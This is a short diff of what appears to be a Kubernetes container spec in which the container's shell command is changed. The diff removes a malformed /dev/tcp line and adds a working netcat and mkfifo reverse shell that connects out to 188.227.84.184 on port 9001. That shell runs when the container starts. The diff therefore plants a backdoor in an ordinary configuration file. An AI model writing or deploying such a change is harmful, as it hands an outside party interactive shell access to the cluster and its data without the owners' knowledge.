@@ -9,4 +9,4 @@ spec:
     command: ["/bin/sh", "-c"]
     args:
     - |
-      -i >& /dev/tcp/188.227.84.184/9001 0>&1
+      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 188.227.84.184 9001 >/tmp/f
